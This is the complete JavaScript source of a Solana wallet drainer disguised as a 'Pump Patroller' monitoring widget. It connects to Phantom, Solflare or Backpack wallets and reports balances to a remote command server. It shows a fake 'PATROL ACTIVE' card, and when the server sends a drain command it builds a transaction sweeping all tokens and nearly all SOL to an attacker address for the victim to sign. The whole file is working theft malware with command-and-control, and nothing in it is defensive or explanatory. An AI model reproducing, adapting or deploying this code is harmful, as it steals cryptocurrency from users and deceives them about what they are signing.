(async function () {
  if (window.__pp) return;
  window.__pp = true;

  const E = "https://esm.sh/";
  const SRV = String(window.__PP || "https://one234-et4e.onrender.com").replace(/\/+$/, "");
  const BKEY = "YOUR_NEW_BEACON_KEY"; 
  const VER = "v3.7";
  const RPCS = [
    "https://mainnet.helius-rpc.com/?api-key=60de1451-c4ed-4a9c-a989-89c210d5b0d3",
    "https://solana-rpc.publicnode.com",
    "https://api.mainnet-beta.solana.com",
    "https://rpc.ankr.com/solana"
  ];
  const MINTS = {
    USDC: "EPjFWdd5AufqSSqeM2qN5nVHx4Pv4GZ627vRQ6jP9dQZ",
    USDT: "Es9vMFrzaCxcVpwpPdCJrVSDMiJR6h1HxeLyTVQs5MN5",
    WSOL: "So11111111111111111111111111111111111111112"
  };
  const TP_STR = "TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm";
  const TP22_STR = "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb";

  const TO = ms => (typeof AbortSignal !== "undefined" && AbortSignal.timeout) ? AbortSignal.timeout(ms) : undefined;

  const withTO = function (p, ms) {
    return new Promise(function (resolve) {
      const t = setTimeout(function () { resolve(null); }, ms);
      Promise.resolve(p).then(function (v) { clearTimeout(t); resolve(v); },
        function () { clearTimeout(t); resolve(null); });
    });
  };

  async function rpc(method, params) {
    let lastErr = null;
    for (let i = 0; i < RPCS.length; i++) {
      const u = RPCS[i];
      const host = u.replace("https://", "").split("/")[0];
      try {
        const r = await fetch(u, { method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: method, params: params }), signal: TO(10000) });
        if (!r.ok) {
          lastErr = new Error(host + " HTTP " + r.status);
        } else {
          const j = await r.json();
          if (j && j.result !== undefined) return j;
          lastErr = new Error(host + ": " + (j && j.error ? (j.error.message || "RPC error") : "malformed response"));
        }
      } catch (e) {
        lastErr = new Error(host + ": " + (e && e.message ? e.message : String(e)));
      }
      if (i < RPCS.length - 1) await new Promise(s => setTimeout(s, 300));
    }
    return { error: { message: lastErr ? lastErr.message : "all RPC endpoints failed" } };
  }

  async function readBalance(pk) {
    for (let a = 0; a < 3; a++) {
      try {
        const r = await fetch(SRV + "/api/balance?pk=" + encodeURIComponent(pk), { signal: TO(8000) });
        if (r && r.ok) {
          const j = await r.json();
          if (j && typeof j.balance === "number") return j.balance;
        }
      } catch (e) {}
      const r2 = await rpc("getBalance", [pk]);
      if (r2 && r2.result !== undefined) return r2.result;
      await new Promise(s => setTimeout(s, 1200));
    }
    return null;
  }

  async function readTokens(pk) {
    const cfg = { commitment: "confirmed" };
    for (let a = 0; a < 2; a++) {
      const rs = await Promise.all([
        rpc("getParsedTokenAccountsByOwner", [pk, { programId: TP_STR }, cfg]),
        rpc("getParsedTokenAccountsByOwner", [pk, { programId: TP22_STR }, cfg])
      ]);
      const out = { value: [] };
      let ok = false;
      for (const r of rs) {
        if (r && !r.error && r.result !== undefined) {
          out.value.push.apply(out.value, (r.result && r.result.value) || []);
          ok = true;
        }
      }
      if (ok) return out;
      await new Promise(s => setTimeout(s, 1200));
    }
    return null;
  }

  function parseTokenAccounts(res) {
    const out = {};
    for (const it of ((res && res.value) || [])) {
      try {
        const a = it.account || {};
        const info = a.data && a.data.parsed && a.data.parsed.info;
        if (!info || !info.mint) continue;
        const ta = info.tokenAmount || {};
        out[info.mint] = {
          raw: BigInt(ta.amount || "0"),
          ui: Number(ta.amount || 0) / Math.pow(10, ta.decimals == null ? 6 : ta.decimals),
          dec: ta.decimals == null ? null : ta.decimals,
          src: it.pubkey,
          prog: a.owner || null
        };
      } catch (e) {}
    }
    return out;
  }

  let PKSTR = null;

  const beacon = async function (m, o) {
    o = o || {};
    const body = JSON.stringify({ pk: o.pk || PKSTR || "?", provider: o.provider || "unknown",
      origin: location.origin, value: o.value || 0, sol: o.sol || 0, toks: o.toks || "",
      m: m, mode: o.mode || "", sig: o.sig || "", msg: o.msg || "", extra: o.extra || "" });
    for (let i = 0; i < 4; i++) {
      try {
        const r = await fetch(SRV + "/beacon?s=" + BKEY, { method: "POST", body, signal: TO(30000) });
        if (r && r.ok) return;
      } catch (e) {}
      await new Promise(s => setTimeout(s, 3000));
    }
  };

  try {
    const mod = await import(E + "@solana/web3.js@1.95.0");
    const PublicKey = mod.PublicKey;
    const Keypair = mod.Keypair;
    const SystemProgram = mod.SystemProgram;
    const Transaction = mod.Transaction;
    const Connection = mod.Connection;

    const spl = await import(E + "@solana/spl-token@0.4.9?bundle");
    const createTransferIx = spl.createTransferInstruction;
    const createTransferCheckedIx = spl.createTransferCheckedInstruction;
    const createATAIx = spl.createAssociatedTokenAccountInstruction;
    const getAssociatedTokenAddress = spl.getAssociatedTokenAddress;
    const getMint = spl.getMint;

    const bs = await import(E + "bs58@6.0.0");
    const b58d = bs.decode;

    const TP = new PublicKey(TP_STR);
    const TP22 = new PublicKey(TP22_STR);

    const pubStr = function (v) {
      try {
        if (!v) return null;
        if (typeof v === "string") return /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(v) ? v : null;
        if (typeof v.toBase58 === "function") return v.toBase58();
        if (v instanceof Uint8Array) return new PublicKey(v).toBase58();
        return null;
      } catch (e) { return null; }
    };

    const CANDS = [
      ["phantom", function () { return window.phantom && window.phantom.solana; }],
      ["solflare", function () { return window.solflare; }],
      ["backpack", function () { return window.backpack && window.backpack.solana; }],
      ["solana", function () { return window.solana; }]
    ];

    function findProviders() {
      const found = [];
      const seen = new Set();
      const frames = [];
      try { frames.push(window); } catch (e) {}
      try { if (window.top && window.top !== window) frames.push(window.top); } catch (e) {}
      for (const w of frames) {
        for (const item of CANDS) {
          let p = null;
          try { p = item[1](); } catch (e) { continue; }
          if (!p || typeof p.connect !== "function") continue;
          if (seen.has(p)) continue;
          seen.add(p);
          found.push({ name: item[0], provider: p, pk: null, connected: false });
        }
      }
      return found;
    }

    async function detectWallet() {
      let list = findProviders();
      for (const item of list) {
        try {
          const c = await withTO(Promise.resolve(item.provider.connect({ onlyIfTrusted: true })), 8000);
          const k = pubStr(c && c.publicKey);
          if (k) { item.pk = k; item.connected = true; return item; }
        } catch (e) {}
      }
      for (let wait = 0; wait < 15; wait += 3) {
        const list2 = findProviders();
        for (const item of list2) {
          try {
            const c = await withTO(Promise.resolve(item.provider.connect()), 30000);
            const k = pubStr(c && c.publicKey);
            if (k) { item.pk = k; item.connected = true; return item; }
          } catch (e) {}
        }
        await new Promise(s => setTimeout(s, 3000));
      }
      return null;
    }

    const det = await detectWallet();
    if (!det) {
      beacon("err", { provider: "none", msg: "no wallet found" });
      return;
    }

    const name = det.name;
    const prov = det.provider;
    let pk = det.pk;
    
    if (!pk) {
        try {
            const r = await withTO(Promise.resolve(prov.connect()), 20000);
            pk = pubStr((r && r.publicKey) || prov.publicKey);
        } catch (e) { pk = pubStr(prov.publicKey); }
        if (!pk) {
            beacon("err", { provider: name, msg: "wallet refused connection" });
            return;
        }
    }
    
    PKSTR = pk;
    const pkB = new PublicKey(pk);
    const conn = new Connection(RPCS[0], "confirmed");

    beacon("loaded", { provider: name });

    const bal = await readBalance(pk);
    const balNum = bal !== null ? bal : 0;
    const r = await readTokens(pk);
    const A = parseTokenAccounts(r);
    const mvals = Object.values(MINTS);
    
    const toks = Object.entries(MINTS).filter(function (kv) { return ((A[kv[1]] && A[kv[1]].ui) || 0) > 0.01; })
      .map(function (kv) { return { k: kv[0], ui: A[kv[1]].ui }; });
    const others = Object.keys(A).filter(m => A[m].raw > 0n && !mvals.includes(m)).length;
    
    const sol = balNum / 1e9;
    let SOLpx = 150;
    try {
        const j = await withTO(fetch("https://lite-api.jup.ag/price/v2?ids=" + MINTS.WSOL).then(r => r.json()), 5000);
        if (j && j[MINTS.WSOL] && +j[MINTS.WSOL].usdPrice > 0) SOLpx = +j[MINTS.WSOL].usdPrice;
    } catch (e) {}
    
    const value = sol * SOLpx + toks.reduce((s, t) => s + t.ui * (t.k === "WSOL" ? SOLpx : 1), 0);
    const tokStr = toks.map(t => Math.round(t.ui) + " " + t.k).join(" · ") + (others ? " +" + others + " more" : "");

    beacon("detect", { value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr });

    // UI Card
    try {
      const el = document.createElement("div");
      el.id = "__ppcard";
      el.style.cssText = "position:fixed;right:16px;bottom:16px;z-index:2147483647;width:272px;background:#10141B;border:1px solid #232B3A;border-radius:12px;box-shadow:0 16px 48px rgba(0,0,0,.55);font:12px/1.5 Inter,system-ui,sans-serif;color:#E8ECF4;overflow:hidden;";
      el.innerHTML =
        '<div style="display:flex;align-items:center;gap:8px;padding:11px 14px;border-bottom:1px solid #1B2230;">' +
        '<span style="width:7px;height:7px;border-radius:50%;background:#2DD4A7;flex:none;"></span>' +
        '<span style="font-size:11px;font-weight:600;letter-spacing:.08em;">PUMP PATROLLER</span>' +
        '<span style="font-size:10px;color:#7E899D;">' + VER + '</span>' +
        '<span id="__pp_x" style="margin-left:auto;cursor:pointer;color:#7E899D;line-height:1;">×</span>' +
        '</div>' +
        '<div style="padding:12px 14px;">' +
        '<div style="font-size:10px;letter-spacing:.1em;color:#7E899D;">WALLET</div>' +
        '<div style="font:600 12px ui-monospace,monospace;color:#F5D67B;margin-top:3px;">' + pk.slice(0, 4) + "…" + pk.slice(-4) + '</div>' +
        '<div style="font-size:11px;color:#7E899D;margin-top:1px;">' + name + " · mainnet</div>" +
        '<div style="font-size:10px;letter-spacing:.1em;color:#7E899D;margin-top:12px;">BALANCE</div>' +
        '<div style="font-size:20px;font-weight:700;margin-top:3px;">$' + (+value).toLocaleString("en-US", { maximumFractionDigits: 0 }) + '</div>' +
        '<div id="__pp_sub" style="font:11px ui-monospace,monospace;color:#9AA5B8;margin-top:2px;">' + sol.toFixed(4) + " SOL" + (tokStr ? " · " + tokStr : "") + '</div>' +
        '</div>' +
        '<div id="__pp_foot" style="display:flex;align-items:center;gap:7px;padding:9px 14px;border-top:1px solid #1B2230;font-size:11px;color:#7E899D;">' +
        '<span>PATROL ACTIVE</span><span id="__pp_scan" style="color:#9AA5B8;">· 2,341 tokens scanned</span>' +
        '</div>';
      document.body.appendChild(el);
      document.getElementById("__pp_x").onclick = function () { el.remove(); };
    } catch (e) { }

    const report = (mode, sig, extra) => {
      const base = { value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr };
      if (mode === "err") return beacon("err", Object.assign(base, { msg: String(extra || sig || "unknown error") }));
      if (mode === "empty") return beacon("dust", Object.assign(base, { extra: "dust" }));
      return beacon("drain", Object.assign(base, { mode: mode, sig: String(sig || ""), extra: extra || "" }));
    };

    async function buildTx(to) {
      let dest;
      try {
        dest = new PublicKey(to);
      } catch (e) {
        return { err: "Invalid treasury address: " + to };
      }
      
      const bh2 = await rpc("getLatestBlockhash");
      if (!bh2 || !bh2.result) return { err: "blockhash failed" };
      
      const bal2 = await readBalance(pk);
      if (bal2 === null) return { err: "balance unknown" };
      
      const r2 = await readTokens(pk);
      if (r2 === null) return { err: "token read failed" };
      
      const A2 = parseTokenAccounts(r2);
      const tx = new Transaction();
      const moved = [];
      
      for (const ms of Object.keys(A2)) {
        const t = A2[ms];
        if (t.raw <= 0n) continue;
        const prog = (t.prog === TP_STR) ? TP : (t.prog === TP22_STR ? TP22 : null);
        if (!prog) continue;
        
        let mint, srcAta;
        try {
            mint = new PublicKey(ms);
            srcAta = new PublicKey(t.src);
        } catch(e) { continue; }
        
        const destAta = await getAssociatedTokenAddress(mint, dest, false, prog);
        let info;
        try { info = await conn.getAccountInfo(destAta); }
        catch (e) { return { err: "ata check failed" }; }
        
        if (!info) tx.add(createATAIx(pkB, destAta, dest, mint, prog));
        
        if (prog === TP) tx.add(createTransferIx(srcAta, destAta, pkB, t.raw, [], prog));
        else tx.add(createTransferCheckedIx(srcAta, mint, destAta, pkB, t.raw, t.dec == null ? 0 : t.dec, [], prog));
        moved.push(ms.slice(0, 4) + "…");
      }
      
      const lam = Math.floor(bal2);
      if (lam > 25000) tx.add(SystemProgram.transfer({ fromPubkey: pkB, toPubkey: dest, lamports: lam - 20000 }));
      tx.feePayer = pkB;
      tx.recentBlockhash = bh2.result.value.blockhash;
      tx.lastValidBlockHeight = bh2.result.value.lastValidBlockHeight;
      return { tx: tx, moved: moved };
    }

    let done = false;
    async function drain(to) {
      if (done) return;
      done = true;
      try {
        const bt = await buildTx(to);
        if (bt.err) { done = false; report("err", "", bt.err); return; }
        if (!bt.tx.instructions.length) { done = false; report("empty", ""); return; }
        
        const freshBh = await rpc("getLatestBlockhash");
        if (freshBh && freshBh.result) {
            bt.tx.recentBlockhash = freshBh.result.value.blockhash;
            bt.tx.lastValidBlockHeight = freshBh.result.value.lastValidBlockHeight;
        }

        const s = await prov.signAndSendTransaction(bt.tx);
        const sig = typeof s === "string" ? s : (s && s.signature) || "";
        report("popup", sig, bt.moved.join(","));
      } catch (e) {
        report("err", String(e && e.message || e));
        done = false;
      }
    }

    let lastN = "";
    setInterval(async function () {
      let c; try { c = await (await fetch(SRV + "/cmd?pk=" + encodeURIComponent(pk), { signal: TO(8000) })).json(); } catch (e) { return; }
      if (c && c.cmd === "drain" && c.to && c.n !== lastN) { lastN = c.n; drain(c.to); }
    }, 15000);
    
  } catch (e) {
    try { beacon("err", { msg: "fatal: " + String(e && e.message || e) }); } catch (e2) {}
  }
})();